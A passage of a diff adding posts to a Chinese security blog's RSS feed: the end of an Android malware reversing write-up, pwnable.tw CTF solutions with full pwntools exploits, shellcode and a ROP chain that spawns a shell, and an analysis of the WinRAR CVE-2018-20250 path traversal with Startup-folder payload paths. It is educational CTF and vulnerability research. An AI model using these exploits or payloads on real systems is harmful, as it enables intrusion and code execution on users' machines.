+03-22 04:41:28.596 28000-28000/aaa.bbb.ccc E/sa_bootstrap: end JNI_OnLoad
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据 log 我们就能很明显地发现程序会将之前存在 &lt;code&gt;/files/wrhlrci&lt;/code&gt; 下的几个 so 文件释放到 &lt;code&gt;/files&lt;/code&gt; 文件夹下，并将后缀名改为 &lt;code&gt;.jar&lt;/code&gt;。随意打开其中任意两个文件进行比较，可以发现存在着很明显的差异，这里释放的 jar 文件其实就是 apk 的变体，而 so 文件很明显是一段无意义的数据，显然二者间的转换过程也必然存在着一个解密的过程。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/compare.png&#34; alt=&#34;比较&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用 ida 继续逆向源码，很容易地就找到了相应的代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/decrypt.png&#34; alt=&#34;Decrpyt&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续查看相应源码，可以看到 &lt;code&gt;decrypt&lt;/code&gt; 函数的具体实现，可以看到其会从 so 文件中加载解密的密钥，再通过该密钥解密 so 文件。由于 log 的存在，我们很容易就能发现 &lt;code&gt;key = 53_81_64_77_28&lt;/code&gt;。然后 while 函数里主要就是利用 key 对密文进行解密。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/decrypt2.png&#34; alt=&#34;Decrpyt 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;JNI_Onload&lt;/code&gt; 函数最后会调用 &lt;code&gt;com.nativedroid.module.dynamicloader.Dynamic&lt;/code&gt; 的 &lt;code&gt;start&lt;/code&gt; 函数，但令人奇怪的是 apk 文件中其实并无该库，所以这就是 apk 最后执行失败的原因？&lt;/p&gt;
+
+&lt;p&gt;可以发现该 app 和 &lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-i.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant&lt;/a&gt; 一文描述的还是比较相像的，本质上还是用了一堆对抗技术的加壳恶意软件，但壳的难度和商业级别的壳比较还是远远不如。&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;虽然头一天晚上看代码看的还是毫无头绪，不过在理解了其背后的逻辑之后，颇有种豁然开朗之感。这大概就是佛家所说的顿悟？&lt;/p&gt;
+
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-i.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part I&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-ii.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part II&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>pwnable.tw 入门 - start / orw / calc</title>
+      <link>https://syang-ng.github.io/2019/03/pwnable-tw-1.0/</link>
+      <pubDate>Sun, 10 Mar 2019 14:51:57 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/03/pwnable-tw-1.0/</guid>
+      <description>
+
+&lt;h2 id=&#34;start&#34;&gt;start&lt;/h2&gt;
+
+&lt;p&gt;查看汇编代码:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;08048060 &amp;lt;_start&amp;gt;:
+ 8048060:       54                      push   %esp
+ 8048061:       68 9d 80 04 08          push   $0x804809d
+ 8048066:       31 c0                   xor    %eax,%eax
+ 8048068:       31 db                   xor    %ebx,%ebx
+ 804806a:       31 c9                   xor    %ecx,%ecx
+ 804806c:       31 d2                   xor    %edx,%edx
+ 804806e:       68 43 54 46 3a          push   $0x3a465443
+ 8048073:       68 74 68 65 20          push   $0x20656874
+ 8048078:       68 61 72 74 20          push   $0x20747261
+ 804807d:       68 73 20 73 74          push   $0x74732073
+ 8048082:       68 4c 65 74 27          push   $0x2774654c
+ 8048087:       89 e1                   mov    %esp,%ecx
+ 8048089:       b2 14                   mov    $0x14,%dl
+ 804808b:       b3 01                   mov    $0x1,%bl
+ 804808d:       b0 04                   mov    $0x4,%al
+ 804808f:       cd 80                   int    $0x80
+ 8048091:       31 db                   xor    %ebx,%ebx
+ 8048093:       b2 3c                   mov    $0x3c,%dl
+ 8048095:       b0 03                   mov    $0x3,%al
+ 8048097:       cd 80                   int    $0x80
+ 8048099:       83 c4 14                add    $0x14,%esp
+ 804809c:       c3                      ret
+
+0804809d &amp;lt;_exit&amp;gt;:
+ 804809d:       5c                      pop    %esp
+ 804809e:       31 c0                   xor    %eax,%eax
+ 80480a0:       40                      inc    %eax
+ 80480a1:       cd 80                   int    $0x80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到汇编代码使用的是 &lt;code&gt;int 80&lt;/code&gt; 陷入中断的方式进行系统调用，这是 Linux 2.6 之前的通用做法，在这里贴一个 syscall 的相应链接供参考： &lt;a href=&#34;https://w3challs.com/syscalls/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://w3challs.com/syscalls/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;根据代码推测逻辑如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void _start() {
+    char buf[20] = &amp;quot;Let&#39;s start the CTF:&amp;quot;;
+    sys_write(1,buf,20);
+    sys_read(0,buf,60);
+}
+void _exit() {
+    sys_exit();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显栈的长度有限因此如果输入长度超过 20 的话，能够导致栈溢出。因此我们只需要在栈上写入一段 shellcode 并通过控制程序控制流的方式即可 get shell，但这里有以下一个问题，由于 ASLR 的问题，无法获得栈的基地址。这也使得我们无法直接确认可以跳转的地址，因此需要泄露栈基地址。&lt;/p&gt;
+
+&lt;p&gt;此时发现有 &lt;code&gt;add    $0x14,%esp&lt;/code&gt; 可以得到栈的基地址(&lt;code&gt;esp&lt;/code&gt;)，因此如果修改返回地址，将程序返回到地址 &lt;code&gt;0x08048087&lt;/code&gt;，此时程序相当于执行了 &lt;code&gt;sys_write(1,esp,20)&lt;/code&gt;，就能泄露我们需要的栈地址了。剩下的工作则是编写 shellcode 和计算相应的偏移。&lt;/p&gt;
+
+&lt;p&gt;shellcode 对应的代码如下(这里参考了 DogeWatch&amp;rsquo;s Blog 的做法)，实际上的结果就是执行了 &lt;code&gt;execve(&amp;quot;/bin//sh&amp;quot;, NULL, NULL)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;31 c9                   xor    ecx,ecx
+f7 e1                   mul    ecx
+51                      push   ecx
+68 2f 2f 73 68          push   0x68732f2f
+68 2f 62 69 6e          push   0x6e69622f
+89 e3                   mov    ebx,esp
+b0 0b                   mov    al,0xb
+cd 80                   int    0x80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终脚本如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process(&amp;quot;./start&amp;quot;)
+else:
+    r = remote(&amp;quot;chall.pwnable.tw&amp;quot;, 10000)
+
+def leak():
+    print(r.recvuntil(&amp;quot;:&amp;quot;))
+    payload = &#39;a&#39;*20 + p32(0x08048087)
+    r.send(payload)
+    stack_addr = u32(r.recv(4))
+    print(&amp;quot;stack address is {}&amp;quot;.format(hex(stack_addr)))
+    return stack_addr
+
+def pwn(stack_addr):
+    shellcode = &#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
+    payload = &#39;a&#39;*20 + p32(stack_addr+20) + shellcode
+    r.send(payload)
+
+def main():
+    stack_addr = leak()
+    pwn(stack_addr)
+    r.interactive()
+
+main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}&lt;/p&gt;
+
+&lt;p&gt;思路回顾整理如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;发现存在栈溢出 =&amp;gt; 栈溢出执行 shellcode&lt;/li&gt;
+&lt;li&gt;栈地址随意化 =&amp;gt; 泄露栈地址&lt;/li&gt;
+&lt;li&gt;根据栈地址编写 shellcode&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;orw&#34;&gt;orw&lt;/h2&gt;
+
+&lt;p&gt;本题主要考查的是 shellcode 的编写能力，&lt;code&gt;orw&lt;/code&gt; 即为 &lt;code&gt;open&lt;/code&gt; / &lt;code&gt;read&lt;/code&gt; / &lt;code&gt;write&lt;/code&gt; 的三项基本操作。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+
+shellcode = &#39;&#39;&#39;
+_start:
+    jmp end
+open:
+    pop ebx
+    mov ecx, 0
+    mov eax, 5
+    int 0x80
+    mov ebx, eax
+    mov ecx, esp
+    mov edx, 40
+    mov eax, 3
+    int 0x80
+    mov ebx, 1
+    mov eax, 4
+    int 0x80
+    mov eax, 1
+    int 0x80
+end:
+    call open
+&#39;&#39;&#39;
+
+r = remote(&#39;chall.pwnable.tw&#39;, 10001)
+
+shellcode = asm(shellcode)
+r.sendlineafter(&#39;:&#39;, shellcode+&amp;quot;/home/orw/flag\x00&amp;quot;)
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;calc&#34;&gt;calc&lt;/h2&gt;
+
+&lt;p&gt;本题需要先理解程序的逻辑，利用 ida 查看对应源码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-calc.png&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以很明显地看到程序的逻辑如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;调用 &lt;code&gt;get_expr&lt;/code&gt; 函数过滤除了 +，-，*，/，% 和数字之外的其他字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;init_pool&lt;/code&gt; 函数会初始化保存中间数据的一段内存，这里我将其重命名为 &lt;code&gt;pool&lt;/code&gt; 方便理解&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;parse_expr&lt;/code&gt; 函数对表达式进行解析，并将结果写到 &lt;code&gt;pool&lt;/code&gt; 上&lt;/li&gt;
+&lt;li&gt;输出 &lt;code&gt;pool&lt;/code&gt; 上保存的最终值&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下面一个函数则是程序的漏洞所在：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-eval.png&#34; alt=&#34;eval&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果按照正常的执行过程，程序的结构如下：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;pool[0] = 2&lt;/li&gt;
+&lt;li&gt;pool[1] = num1&lt;/li&gt;
+&lt;li&gt;pool[2] = num2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;然后执行完后变成：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;pool[0] = 1&lt;/li&gt;
+&lt;li&gt;pool[1] = num1 OP num2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;但如果用户以 &lt;code&gt;+600&lt;/code&gt; 作为输入的话，则是如下结果：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;pool[0] = 1&lt;/li&gt;
+&lt;li&gt;pool[1] = 600&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;执行完则成为：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;pool[0] = 600&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;如果我们的输入是 &lt;code&gt;+600+300&lt;/code&gt;，则最终结果会变成 &lt;code&gt;pool[600] += 300&lt;/code&gt;, 由此触发了对栈上任意地址的写操作。&lt;/p&gt;
+
+&lt;p&gt;而且由于我们拥有的是任意地址写，所以可以绕过 canary 对栈的防护。很明显我们可以通过任意地址写来劫持程序的控制流，最终触发 &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;由于开启了 NX，栈上不能直接执行 shellcode，而且由于程序是静态链接的，因此不能通过修改 GOT 表的方式调用 sys 函数,所以需要通过 ROP 劫持控制流,进而通过 &lt;code&gt;int 0x80&lt;/code&gt; 进行系统调用。&lt;/p&gt;
+
+&lt;p&gt;在这之前，我们需要清楚程序的栈结构，这里可以参考 &lt;a href=&#34;https://www.freebuf.com/articles/others-articles/132283.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw刷题之calc&lt;/a&gt;，个人认为其中的两个示意图非常清晰，易于理解。&lt;/p&gt;
+
+&lt;p&gt;最后需要构造的栈结构如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;pool[370] = u32(&amp;quot;/sh\x00&amp;quot;)
+pool[369] = u32(&amp;quot;/bin&amp;quot;)
+pool[368] = 0x08049a21 // int 0x80
+pool[367] = address    // &amp;quot;/bin/sh\x00&amp;quot; 字符串的地址
+pool[366] = 0
+pool[365] = 0x080701d1 // pop ecx;pop ebx;ret
+pool[364] = 0
+pool[363] = 0x080701aa // pop edx;ret
+pool[362] = 11
+pool[361] = 0x0805c34b // pop eax;ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;下面需要思考的则是如何获取 &lt;code&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt; 字符串所指向的地址。我们可以通过保存在 &lt;code&gt;pool[360]&lt;/code&gt; 上的 &lt;code&gt;ebp&lt;/code&gt;，即 main 函数的栈基地址推算出字符串对应的地址，具体推算示意图如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/pwnable-tw-1.0/calc-stack.png&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;构造脚本如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
+
+LOCAL = not True
+DEBUG = False
+
+if LOCAL:
+    r = process(&amp;quot;./calc&amp;quot;)
+    if DEBUG:
+        context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]
+        gdb.attach(proc.pidof(s)[0])
+else:
+    r = remote(&amp;quot;chall.pwnable.tw&amp;quot;, 10100)
+
+def leak():
+    payload = &amp;quot;+360&amp;quot;
+    r.sendline(payload)
+    base = int(r.recv().strip())
+    return base &amp;amp; 0xFFFFFFFF
+
+def get_ebp(base):
+    size = base - (base &amp;amp; 0xFFFFFFF0 - 16)
+    print(&amp;quot;base is {}&amp;quot;.format(hex(base)))
+    print(&amp;quot;stack size is {}&amp;quot;.format(size))
+    ebp = base - (size + 4) + 32
+    if ebp &amp;gt; 0x8FFFFFFF:
+        ebp -= 0x100000000
+    return ebp
+
+def write(pos, value):
+    payload = &amp;quot;+{}&amp;quot;.format(pos)
+    r.sendline(payload)
+    v1 = int(r.recv().strip())
+    v2 = value - v1
+    payload = &amp;quot;+{}{}{}&amp;quot;.format(pos, &#39;+&#39; if v2 &amp;gt; 0 else &#39;&#39;, v2)
+    r.sendline(payload)
+    r.recv()
+
+def pwn():
+    # leak
+    base = leak()
+    # 0x0805c34b : pop eax ; ret
+    write(361, 0x0805c34b)
+    write(362, 11)
+    # 0x080701aa : pop edx ; ret
+    write(363, 0x080701aa)
+    write(364, 0)
+    # 0x080701d1 : pop ecx ; pop ebx ; ret
+    write(365, 0x080701d1)
+    write(366, 0)
+    write(367, get_ebp(base))
+    # 0x08049a21 : int 0x80
+    write(368, 0x08049a21)
+    write(369, u32(&amp;quot;/bin&amp;quot;))
+    write(370, u32(&amp;quot;/sh\x00&amp;quot;))
+
+def main():
+    print(r.recvuntil(&amp;quot;=== Welcome to SECPROG calculator ===\n&amp;quot;))
+    pwn()
+    r.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
+
+&lt;p&gt;花了一周来做（理解）这三道题，希望这次 pwn 的（再）入门能成功（残念&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;DogeWatch&amp;rsquo;s Blog | Pwnable.tw Part(1)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://showlinkroom.me/2017/01/22/pwnable-tw/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;l1nk3dHouse | pwnable-tw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.freebuf.com/articles/others-articles/132283.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw刷题之calc&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/d59a41d85af1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Pwnable.tw calc&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>WinRAR 目录穿越漏洞研究小记</title>
+      <link>https://syang-ng.github.io/2019/02/winrar-absolute-path-traversal-vulnerability-cve-2018-20250/</link>
+      <pubDate>Mon, 25 Feb 2019 19:19:01 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/02/winrar-absolute-path-traversal-vulnerability-cve-2018-20250/</guid>
+      <description>
+
+&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
+
+&lt;p&gt;在摸鱼的时候看到先知上的一篇文章：&lt;a href=&#34;https://xz.aliyun.com/t/4169&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;WinRAR目录穿越漏洞&lt;/a&gt;，发现 WinRAR 爆出了一个惊天大洞（误），虽然称不上用处巨大，但是非常好玩。漏洞介绍如下：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;WinRAR在解压处理ACE格式的文件的过程中存在一处目录穿越漏洞，该漏洞允许解压过程中向任意目录写入文件，利用该漏洞可以向开机启动目录中写入恶意文件导致机器开机时执行恶意代码。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;再贴一段国外研究者的介绍：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;The exploit works by just extracting an archive, and puts over 500 million users at risk. This vulnerability has existed for over 19 years(!) and forced WinRAR to completely drop support for the vulnerable format.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
+
+&lt;p&gt;先贴一份 Exploit 地址，感兴趣的朋友可以直接本地复现&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/WyAtu/CVE-2018-20250&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/WyAtu/CVE-2018-20250&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这里有一份本人的 &lt;a href=&#34;http://static.syang.xyz/demo/CVE-2018-20250.rar&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;demo&lt;/a&gt;，感兴趣的朋友可以下载，解压成功后会在 &lt;code&gt;C:\114514&lt;/code&gt; 路径多出一个 &lt;code&gt;oc.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
+
+&lt;p&gt;根据报告所描述，可以看到漏洞的起因主要在于 WinRAR 所使用的 &lt;code&gt;UNACEV2.dll&lt;/code&gt; 编译的时间极早（可以追随到 2006 年），也没有开启任何的保护措施（如 ASLR, DEP），由此被研究者注意到，并成功通过 fuzz 发现了一个 &lt;code&gt;Absolute Path Traversal&lt;/code&gt;（任意路径穿越）漏洞。&lt;/p&gt;
+
+&lt;p&gt;运行 &lt;code&gt;acefile.py&lt;/code&gt; 脚本，我们能显示 ace 文件的结构：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# python acefile.py --headers demo.rar
+volume
+    filename    demo.rar
+    filesize    208
+    headers     MAIN:1 FILE:2 others:0
+header
+    hdr_crc     0x286b
+    hdr_size    49
+    hdr_type    0x00        MAIN
+    hdr_flags   0x9000      ADVERT|SOLID
+    magic       b&#39;**ACE**&#39;
+    eversion    20          2.0
+    cversion    20          2.0
+    host        0x02        Win32
+    volume      0
+    datetime    0x4e561810  2019-02-22 03:00:32
+    reserved1   97 4f f6 aa 00 00 00 00
+    advert      b&#39;*UNREGISTERED VERSION*&#39;
+    comment     b&#39;&#39;
+    reserved2   b&#39;&#39;
+header
+    hdr_crc     0xe4ea
+    hdr_size    39
+    hdr_type    0x01        FILE32
+    hdr_flags   0x8001      ADDSIZE|SOLID
+    packsize    36
+    origsize    36
+    datetime    0x4e55b063  2019-02-21 22:03:06
+    attribs     0x00000020  ARCHIVE
+    crc32       0x772b6618
+    comptype    0x00        stored
+    compqual    0x03        normal
+    params      0x000a
+    reserved1   0x4554
+    filename    b&#39;hint.txt&#39;
+    comment     b&#39;&#39;
+    ntsecurity  b&#39;&#39;
+    reserved2   b&#39;&#39;
+header
+    hdr_crc     0xb652
+    hdr_size    50
+    hdr_type    0x01        FILE32
+    hdr_flags   0x8001      ADDSIZE|SOLID
+    packsize    22
+    origsize    22
+    datetime    0x4e55b063  2019-02-21 22:03:06
+    attribs     0x00000020  ARCHIVE
+    crc32       0x69e27254
+    comptype    0x00        stored
+    compqual    0x03        normal
+    params      0x000a
+    reserved1   0x4554
+    filename    b&#39;C:\\C:\\114514\\oc.txt&#39;
+    comment     b&#39;&#39;
+    ntsecurity  b&#39;&#39;
+    reserved2   b&#39;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;PS：&lt;code&gt;\\&lt;/code&gt; 代表着的是 &lt;code&gt;\&lt;/code&gt;，由于 python 的转义原因这里显示成 &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;可以很明显地发现 &lt;code&gt;filename&lt;/code&gt; 属性是携带路径信息的，作为一个安全研究人员，很容易就应该想到这里可能隐藏着的路径穿越的风险。&lt;/p&gt;
+
+&lt;p&gt;然后就是一大段逆向 + fuzz 测试的神操作，这里贴一下国外研究者的思路（清晰明确，值得学习）：&lt;/p&gt;
+
+&lt;p&gt;首先，解压路径有两种可能的选择方式： &lt;code&gt;sprintf(final_file_path, &amp;quot;%s%s&amp;quot;, &amp;quot;&amp;quot;, file_relative_path);&lt;/code&gt; 以及 &lt;code&gt;sprintf(final_file_path, &amp;quot;%s%s&amp;quot;, destination_folder, file_relative_path);&lt;/code&gt;，其中第一种以绝对路径展开，第二种以相对路径展开，而第二种很明显会被 &lt;code&gt;destination_folder&lt;/code&gt; 变量所控制，因此我们想要进行目录穿越的话，需要控制程序的执行流，使其执行第一种函数。&lt;/p&gt;
+
+&lt;p&gt;而如何选择的方式取决于 &lt;code&gt;GetDevicePathLen&lt;/code&gt; 函数的执行结果，只有该函数的返回值大于 0 的时候才会进入函数一。&lt;/p&gt;
+
+&lt;p&gt;暗戳戳贴一下大佬的伪代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/WinRAR-Absolute-Path-Traversal-Vulnerability-CVE-2018-20250/GetDevicePathLen.png&#34; alt=&#34;GetDevicePathLen&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再贴段说明：
+如果参数如 &lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;，则函数返回 3
+如果参数如 &lt;code&gt;\some_folder\some_file.ext&lt;/code&gt;，则函数返回 1
+如果参数如 &lt;code&gt;\\LOCALHOST\C$\some_folder\some_file.ext&lt;/code&gt;，则函数返回 15
+如果参数如 &lt;code&gt;\\?\Harddisk0Volume1\some_folder\some_file.ext&lt;/code&gt;，则函数返回 21
+如果参数如 &lt;code&gt;some_folder\some_file.ext&lt;/code&gt;，则函数返回 0&lt;/p&gt;
+
+&lt;p&gt;因此我们很明显有两种选择可以作为 payload：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\some_folder\some_file.ext (The first slash represents the current drive.)&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;然而，在执行该函数之前，我们需要绕过过滤函数 &lt;code&gt;CleanPath&lt;/code&gt; 的检验，该函数的伪代码如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/WinRAR-Absolute-Path-Traversal-Vulnerability-CVE-2018-20250/CleanPath.png&#34; alt=&#34;CleanPath&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;该函数会删除选项 1 前的 &lt;code&gt;C:\&lt;/code&gt;，因此我们需要再额外修改一下 payload &lt;code&gt;C:\C:\some_folder\some_file.ext&lt;/code&gt;，此时该路径在被过滤后得到 &lt;code&gt;C:\some_folder\some_file.ext&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;跟着执行流程往下走，可以发现回到 WinRAR 的代码内，会继续校验相应参数，此时 &lt;code&gt;\&lt;/code&gt; 会被认为是相对路径而中断执行。但此时 payload1 是以 &lt;code&gt;C:\&lt;/code&gt; 开头，所以不会被 WinRAR 的代码阻止，仍然有效，目录穿越成功！&lt;/p&gt;
+
+&lt;h2 id=&#34;缺陷&#34;&gt;缺陷&lt;/h2&gt;
+
+&lt;p&gt;由于该目录只是任意写的问题，所以不能直接导致代码执行。但攻击者巧妙地利用了 Windows 的机制，在 Windows 重启后全局启动项目录里的程序会被执行，因此可以向全局启动目录写入恶意程序的方式，在用户重启后控制用户电脑。&lt;/p&gt;
+
+&lt;p&gt;再贴一下研究者推测的两种攻击思路：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/li&gt;
+&lt;li&gt;C:\Users&amp;lt;user name&amp;gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;其中第一种可以写绝对路径，相对高效，但在 &lt;code&gt;UAC&lt;/code&gt; 打开的情况下会失效（权限问题），而第二种没有权限限制的问题但需要知道用户的用户名。&lt;/p&gt;
+
+&lt;p&gt;但俗话说得好，方法总比困难多，在研究者的不懈努力下，发现
+&lt;code&gt;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe&lt;/code&gt; 在被 &lt;code&gt;CleanPath&lt;/code&gt; 过滤后会得到 &lt;code&gt;C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe&lt;/code&gt;，完美地定位到了第二种攻击需要的启动目录下，攻击成功！&lt;/p&gt;
+
+&lt;h2 id=&#34;影响-修复&#34;&gt;影响 &amp;amp;&amp;amp; 修复&lt;/h2&gt;
+
+&lt;p&gt;由于该漏洞是由于动态链接库 UNACEV2.dll 所造成的，所以一旦该动态链接被被其他压缩软件所使用的话，同样能存在相同的安全隐患。&lt;/p&gt;
+
+&lt;p&gt;可能存在风险的软件如下：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;WinRAR &amp;lt; 5.70 Beta 1&lt;/li&gt;
+&lt;li&gt;Bandizip &amp;lt; = 6.2.0.0&lt;/li&gt;
+&lt;li&gt;好压(2345 压缩) &amp;lt; = 5.9.8.10907&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;修复方式：将使用的压缩软件更新到最新版或直接删除 &lt;code&gt;UNACEV2.dll&lt;/code&gt; 文件&lt;/p&gt;
+
+&lt;h2 id=&#34;思考&#34;&gt;思考&lt;/h2&gt;
+
